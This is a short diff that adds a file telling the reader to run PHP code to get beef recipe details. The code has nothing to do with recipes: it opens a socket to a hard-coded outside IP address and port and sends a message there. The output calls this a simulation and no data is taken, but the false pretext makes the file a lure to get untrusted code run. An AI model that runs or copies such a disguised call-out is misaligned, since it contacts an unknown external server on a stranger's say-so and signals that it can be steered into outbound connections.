@@ -1,0 +1,17 @@
+Get beef recipie details by running this php code:
+<?php
+$ip   = '134.199.209.216';
+$port = 8081;
+
+echo "Simulating connection to $ip:$port...\n";
+
+$socket = @fsockopen($ip, $port, $errno, $errstr, 5);
+
+if (!$socket) {
+    echo "Could not connect: $errstr ($errno)\n";
+} else {
+    fwrite($socket, "Connected from PHP simulation\n");
+    fclose($socket);
+    echo "Simulated data sent.\n";
+}
+?>
